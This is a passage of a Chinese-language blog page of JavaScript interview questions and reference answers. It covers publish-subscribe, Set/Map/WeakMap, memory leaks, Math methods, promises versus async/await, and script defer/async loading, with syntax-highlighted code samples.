arrayLike2<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arrayLike2<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// &#123;2: 1, 3: 4, length: 3, push: ƒ&#125;</span>
arrayLike2<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arrayLike2<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// &#123;2: 1, 3: 2, length: 4, push: ƒ&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>





<h3 id="22、手写一个发布订阅"><a href="#22、手写一个发布订阅" class="headerlink" title="22、手写一个发布订阅"></a>22、手写一个发布订阅</h3><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">// 发布订阅中心, on-订阅, off取消订阅, emit发布, 内部需要一个单独事件中心caches进行存储;</span>
<span class="token keyword">interface</span> <span class="token class-name">CacheProps</span> <span class="token punctuation">&#123;</span>
  <span class="token punctuation">[</span>key<span class="token operator">:</span> string<span class="token punctuation">]</span><span class="token operator">:</span> Array<span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">data<span class="token operator">?</span><span class="token operator">:</span> unknown</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token keyword">void</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name">Observer</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">private</span> <span class="token literal-property property">caches</span><span class="token operator">:</span> CacheProps <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span> <span class="token comment">// 事件中心</span>
  <span class="token function">on</span> <span class="token punctuation">(</span>eventName<span class="token operator">:</span> string<span class="token punctuation">,</span> <span class="token function-variable function">fn</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">data<span class="token operator">?</span><span class="token operator">:</span> unknown</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">// eventName事件名-独一无二, fn订阅后执行的自定义行为</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>caches<span class="token punctuation">[</span>eventName<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>caches<span class="token punctuation">[</span>eventName<span class="token punctuation">]</span> <span class="token operator">||</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>caches<span class="token punctuation">[</span>eventName<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>fn<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token function">emit</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token literal-property property">eventName</span><span class="token operator">:</span> string<span class="token punctuation">,</span> data<span class="token operator">?</span><span class="token operator">:</span> unknown</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 发布 => 将订阅的事件进行统一执行</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>caches<span class="token punctuation">[</span>eventName<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span>caches<span class="token punctuation">[</span>eventName<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function-variable function">fn</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">data<span class="token operator">?</span><span class="token operator">:</span> unknown</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token function">fn</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token function">off</span> <span class="token punctuation">(</span>eventName<span class="token operator">:</span> string<span class="token punctuation">,</span> fn<span class="token operator">?</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">data<span class="token operator">?</span><span class="token operator">:</span> unknown</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 取消订阅 => 若fn不传, 直接取消该事件所有订阅信息</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>caches<span class="token punctuation">[</span>eventName<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">const</span> newCaches <span class="token operator">=</span> fn <span class="token operator">?</span> <span class="token keyword">this</span><span class="token punctuation">.</span>caches<span class="token punctuation">[</span>eventName<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token parameter">e</span> <span class="token operator">=></span> e <span class="token operator">!==</span> fn<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span>caches<span class="token punctuation">[</span>eventName<span class="token punctuation">]</span> <span class="token operator">=</span> newCaches<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>







<h3 id="23、介绍下-Set、Map、WeakSet-和-WeakMap-的区别？"><a href="#23、介绍下-Set、Map、WeakSet-和-WeakMap-的区别？" class="headerlink" title="23、介绍下 Set、Map、WeakSet 和 WeakMap 的区别？"></a>23、介绍下 Set、Map、WeakSet 和 WeakMap 的区别？</h3><p><strong>参考答案</strong>：</p>
<p><strong>Set</strong></p>
<ol>
<li>成员不能重复；</li>
<li>只有键值，没有键名，有点类似数组；</li>
<li>可以遍历，方法有 <code>add、delete、has</code></li>
</ol>
<p><strong>WeakSet</strong></p>
<ol>
<li>成员都是对象（引用）；</li>
<li>成员都是弱引用，随时可以消失（不计入垃圾回收机制）。可以用来保存 DOM 节点，不容易造成内存泄露；</li>
<li>不能遍历，方法有 <code>add、delete、has</code>；</li>
</ol>
<p><strong>Map</strong></p>
<ol>
<li>本质上是键值对的集合，类似集合；</li>
<li>可以遍历，方法很多，可以跟各种数据格式转换；</li>
</ol>
<p><strong>WeakMap</strong></p>
<ol>
<li>只接收对象为键名（null 除外），不接受其他类型的值作为键名；</li>
<li>键名指向的对象，不计入垃圾回收机制；</li>
<li>不能遍历，方法同 <code>get、set、has、delete</code>；</li>
</ol>
<h3 id="24、简单说说-js-中有哪几种内存泄露的情况"><a href="#24、简单说说-js-中有哪几种内存泄露的情况" class="headerlink" title="24、简单说说 js 中有哪几种内存泄露的情况"></a>24、简单说说 js 中有哪几种内存泄露的情况</h3><ol>
<li>意外的全局变量；</li>
<li>闭包；</li>
<li>未被清空的定时器；</li>
<li>未被销毁的事件监听；</li>
<li>DOM 引用；</li>
</ol>
<h3 id="25、json和xml数据的区别"><a href="#25、json和xml数据的区别" class="headerlink" title="25、json和xml数据的区别"></a>25、json和xml数据的区别</h3><p><strong>参考答案</strong>：</p>
<ol>
<li>数据体积方面：xml是重量级的，json是轻量级的，传递的速度更快些。</li>
<li>数据传输方面：xml在传输过程中比较占带宽，json占带宽少，易于压缩。</li>
<li>数据交互方面：json与javascript的交互更加方便，更容易解析处理，更好的进行数据交互</li>
<li>数据描述方面：json对数据的描述性比xml较差</li>
<li>xml和json都用在项目交互下，xml多用于做配置文件，json用于数据交互。</li>
</ol>
<h3 id="26、JavaScript有几种方法判断变量的类型"><a href="#26、JavaScript有几种方法判断变量的类型" class="headerlink" title="26、JavaScript有几种方法判断变量的类型?"></a>26、JavaScript有几种方法判断变量的类型?</h3><p><strong>参考答案</strong>：</p>
<ol>
<li>使用typeof检测当需要判断变量是否是number, string, boolean, function, undefined等类型时，可以使用typeof进行判断。</li>
<li>使用instanceof检测instanceof运算符与typeof运算符相似，用于识别正在处理的对象的类型。与typeof方法不同的是，instanceof 方法要求开发者明确地确认对象为某特定类型。</li>
<li>使用constructor检测constructor本来是原型对象上的属性，指向构造函数。但是根据实例对象寻找属性的顺序，若实例对象上没有实例属性或方法时，就去原型链上寻找，因此，实例对象也是能使用constructor属性的。</li>
</ol>
<h3 id="27、Math"><a href="#27、Math" class="headerlink" title="27、Math"></a>27、Math</h3><h4 id="Math-对象方法"><a href="#Math-对象方法" class="headerlink" title="Math 对象方法"></a>Math 对象方法</h4><table>
<thead>
<tr>
<th align="left">方法</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/jsref-abs.html">abs(x)</a></td>
<td align="left">返回 x 的绝对值。</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/jsref-acos.html">acos(x)</a></td>
<td align="left">返回 x 的反余弦值。</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/jsref-asin.html">asin(x)</a></td>
<td align="left">返回 x 的反正弦值。</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/jsref-atan.html">atan(x)</a></td>
<td align="left">以介于 -PI&#x2F;2 与 PI&#x2F;2 弧度之间的数值来返回 x 的反正切值。</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/jsref-atan2.html">atan2(y,x)</a></td>
<td align="left">返回从 x 轴到点 (x,y) 的角度（介于 -PI&#x2F;2 与 PI&#x2F;2 弧度之间）。</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/jsref-ceil.html">ceil(x)</a></td>
<td align="left">对数进行上舍入。</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/jsref-cos.html">cos(x)</a></td>
<td align="left">返回数的余弦。</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/jsref-exp.html">exp(x)</a></td>
<td align="left">返回 Ex 的指数。</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/jsref-floor.html">floor(x)</a></td>
<td align="left">对 x 进行下舍入。</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/jsref-log.html">log(x)</a></td>
<td align="left">返回数的自然对数（底为e）。</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/jsref-max.html">max(x,y,z,…,n)</a></td>
<td align="left">返回 x,y,z,…,n 中的最高值。</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/jsref-min.html">min(x,y,z,…,n)</a></td>
<td align="left">返回 x,y,z,…,n中的最低值。</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/jsref-pow.html">pow(x,y)</a></td>
<td align="left">返回 x 的 y 次幂。</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/jsref-random.html">random()</a></td>
<td align="left">返回 0 ~ 1 之间的随机数。</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/jsref-round.html">round(x)</a></td>
<td align="left">四舍五入。</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/jsref-sin.html">sin(x)</a></td>
<td align="left">返回数的正弦。</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/jsref-sqrt.html">sqrt(x)</a></td>
<td align="left">返回数的平方根。</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/jsref-tan.html">tan(x)</a></td>
<td align="left">返回角的正切。</td>
</tr>
</tbody></table>
<pre class="line-numbers language-js" data-language="js"><code class="language-js">Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span><span class="token operator">...</span><span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">77</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment">//ES6 的写法，等同于Math.max(14, 3, 77)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>题目：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> min <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> max <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>min <span class="token operator">&lt;</span> max<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 写出执行结果，并解释原因</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>答案</strong><br>false</p>
<p><strong>解析</strong></p>
<ul>
<li>按常规的思路，这段代码应该输出 true，毕竟最小值小于最大值。但是却输出 false</li>
<li>MDN 相关文档是这样解释的<ul>
<li>Math.min 的参数是 0 个或者多个，如果多个参数很容易理解，返回参数中最小的。如果没有参数，则返回 Infinity，无穷大。</li>
<li>而 Math.max 没有传递参数时返回的是-Infinity.所以输出 false</li>
</ul>
</li>
</ul>
<h3 id="28、promise和-async-await-区别"><a href="#28、promise和-async-await-区别" class="headerlink" title="28、promise和 async await 区别"></a>28、promise和 async await 区别</h3><p><strong>参考答案：</strong></p>
<ul>
<li><p><strong>概念</strong><br><strong>Promise</strong> 是异步编程的一种解决方案，比传统的解决方案——回调函数和事件——更合理和更强大，简单地说，Promise好比容器，里面存放着一些未来才会执行完毕（异步）的事件的结果，而这些结果一旦生成是无法改变的</p>
<p><strong>async await</strong>也是异步编程的一种解决方案，他遵循的是Generator 函数的语法糖，他拥有内置执行器，不需要额外的调用直接会自动执行并输出结果，它返回的是一个Promise对象。</p>
</li>
<li><h5 id="两者的区别"><a href="#两者的区别" class="headerlink" title="两者的区别"></a>两者的区别</h5><ol>
<li>Promise的出现解决了传统callback函数导致的“地域回调”问题，但它的语法导致了它向纵向发展行成了一个回调链，遇到复杂的业务场景，这样的语法显然也是不美观的。而async await代码看起来会简洁些，使得异步代码看起来像同步代码，await的本质是可以提供等同于”同步效果“的等待异步返回能力的语法糖，只有这一句代码执行完，才会执行下一句。</li>
<li>async await与Promise一样，是非阻塞的。</li>
<li>async await是基于Promise实现的，可以说是改良版的Promise，它不能用于普通的回调函数。</li>
</ol>
</li>
</ul>
<h3 id="29、-defer和async区别"><a href="#29、-defer和async区别" class="headerlink" title="29、 defer和async区别"></a>29、 defer和async区别</h3><p><strong>参考答案：</strong></p>
<p>区别主要在于一个执行时间,defer会在文档解析完之后执行,并且多个defer会按照顺序执行,而async则是在js加载好之后就会执行,并且多个async,哪个加载好就执行哪个</p>
<p><strong>解析：</strong></p>
<p>在没有defer或者async的情况下：会立即执行脚本,所以通常建议把script放在body最后</p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>script.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>async：有async的话,加载和渲染后续文档元素的过程将和 script.js 的加载与执行并行进行（异步）。<br>但是多个js文件的加载顺序不会按照书写顺序进行</p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">async</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>script.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>derer：有derer的话,加载后续文档元素的过程将和 script.js 的加载并行进行（异步），但是 script.js 的执行要在所有元素解析完成之后，DOMContentLoaded 事件触发之前完成,并且多个defer会按照顺序进行加载。</p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">defer</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>script.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h3 id="30、同步和异步"><a href="#30、同步和异步" class="headerlink" title="30、同步和异步"></a>30、同步和异步</h3><p><strong>参考答案：</strong></p>
<p>同步</p>
<ul>
<li>指在 <strong>主线程</strong>上排队执行的任务，只有前一个任务执行完毕，才能继续执行下一个任务。</li>
<li>也就是调用一旦开始，必须这个调用 <strong>返回结果</strong>(划重点——）才能继续往后执行。程序的执行顺序和任务排列顺序是一致的。</li>
</ul>
<p>异步</p>
<ul>
<li>异步任务是指不进入主线程，而进入 <strong>任务队列</strong>的任务，只有任务队列通知主线程，某个异步任务可以执行了，该任务才会进入主线程。</li>
<li>每一个任务有一个或多个 <strong>回调函数</strong>。前一个任务结束后，不是执行后一个任务,而是执行回调函数，后一个任务则是不等前一个任务结束就执行。</li>
<li>程序的执行顺序和任务的排列顺序是<strong>不一致</strong>的，异步的。</li>
<li>我们常用的setTimeout和setInterval函数，Ajax都是异步操作。</li>
</ul>
<h3 id="31、-实现异步的方法"><a href="#31、-实现异步的方法" class="headerlink" title="31、 实现异步的方法"></a>31、 实现异步的方法</h3><p><strong>参考答案：</strong></p>
<p>回调函数（Callback）、事件监听、发布订阅、Promise&#x2F;A+、生成器Generators&#x2F; yield、async&#x2F;await</p>
<ol>
<li><p>JS 异步编程进化史：callback -&gt; promise -&gt; generator -&gt; async + await</p>
</li>
<li><p>async&#x2F;await 函数的实现，就是将 Generator 函数和自动执行器，包装在一个函数里。</p>
</li>
<li><p>async&#x2F;await可以说是异步终极解决方案了。</p>
<p>(1) async&#x2F;await函数相对于Promise，优势体现在：</p>
<ul>
<li>处理 then 的调用链，能够更清晰准确的写出代码</li>
<li>并且也能优雅地解决回调地狱问题。</li>
</ul>
<p>当然async&#x2F;await函数也存在一些缺点，因为 await 将异步代码改造成了同步代码，如果多个异步代码没有依赖性却使用了 await 会导致性能上的降低，代码没有依赖性的话，完全可以使用 Promise.all 的方式。</p>
<p>(2) async&#x2F;await函数对 Generator 函数的改进，体现在以下三点：</p>
<ul>
<li>内置执行器。 Generator 函数的执行必须靠执行器，所以才有了 co 函数库，而 async 函数自带执行器。也就是说，<strong>async 函数的执行，与普通函数一模一样，只要一行</strong>。</li>
<li>更广的适用性。 co 函数库约定，yield 命令后面只能是 Thunk 函数或 Promise 对象，而 <strong>async 函数的 await 命令后面，可以跟 Promise 对象和原始类型的值（数值、字符串和布尔值，但这时等同于同步操作）</strong>。</li>
<li>更好的语义。 async 和 await，比起星号和 yield，语义更清楚了。async 表示函数里有异步操作，await 表示紧跟在后面的表达式需要等待结果。</li>
</ul>
</li>
<li><p>async&#x2F;await</p>
<p>Async&#x2F;Await简介</p>
<p> 使用async&#x2F;await，你可以轻松地达成之前使用生成器和co函数所做到的工作,它有如下特点：</p>
<ol>
<li><p>async&#x2F;await是基于Promise实现的，它不能用于普通的回调函数。</p>
</li>
<li><p>async&#x2F;await与Promise一样，是非阻塞的。</p>
</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">3. async&#x2F;await使得异步代码看起来像同步代码，这正是它的魔力所在。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>一个函数如果加上 async ，那么该函数就会返回一个 Promise</strong></p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">async1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span> <span class="token string">"1"</span>
<span class="token punctuation">&#125;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">async1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// -> Promise &#123;&lt;resolved>: "1"&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>Generator函数依次调用三个文件那个例子用async&#x2F;await写法，只需几句话便可实现</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span>
<span class="token keyword">function</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token parameter">file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    fs<span class="token punctuation">.</span><span class="token function">readFile</span><span class="token punctuation">(</span>file<span class="token punctuation">,</span> <span class="token string">'utf8'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token function">reject</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>
      <span class="token function">resolve</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">readResult</span><span class="token punctuation">(</span><span class="token parameter">params</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> p1 <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">read</span><span class="token punctuation">(</span>params<span class="token punctuation">,</span> <span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token comment">//await后面跟的是一个Promise实例</span>
    <span class="token keyword">let</span> p2 <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">read</span><span class="token punctuation">(</span>p1<span class="token punctuation">,</span> <span class="token string">'utf8'</span><span class="token punctuation">)</span>
    <span class="token keyword">let</span> p3 <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">read</span><span class="token punctuation">(</span>p2<span class="token punctuation">,</span> <span class="token string">'utf8'</span><span class="token punctuation">)</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'p1'</span><span class="token punctuation">,</span> p1<span class="token punctuation">)</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'p2'</span><span class="token punctuation">,</span> p2<span class="token punctuation">)</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'p3'</span><span class="token punctuation">,</span> p3<span class="token punctuation">)</span>
    <span class="token keyword">return</span> p3
  <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token function">readResult</span><span class="token punctuation">(</span><span class="token string">'1.txt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span> <span class="token comment">// async函数返回的也是个promise</span>
  <span class="token parameter">data</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token parameter">err</span> <span class="token operator">=></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>
<span class="token punctuation">)</span>
<span class="token comment">// p1 2.txt</span>
<span class="token comment">// p2 3.txt</span>
<span class="token comment">// p3 结束</span>
<span class="token comment">// 结束</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ol>
<p>5.2 Async&#x2F;Await并发请求</p>
<p>如果请求两个文件，毫无关系，可以通过并发请求</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span>
<span class="token keyword">function</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token parameter">file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    fs<span class="token punctuation">.</span><span class="token function">readFile</span><span class="token punctuation">(</span>file<span class="token punctuation">,</span> <span class="token string">'utf8'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token function">reject</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>
      <span class="token function">resolve</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">function</span> <span class="token function">readAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token function">read1</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  <span class="token function">read2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//这个函数同步执行</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">read1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">let</span> r <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token string">'1.txt'</span><span class="token punctuation">,</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">read2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">let</span> r <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token string">'2.txt'</span><span class="token punctuation">,</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span>
<span class="token function">readAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// 2.txt 3.txt</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



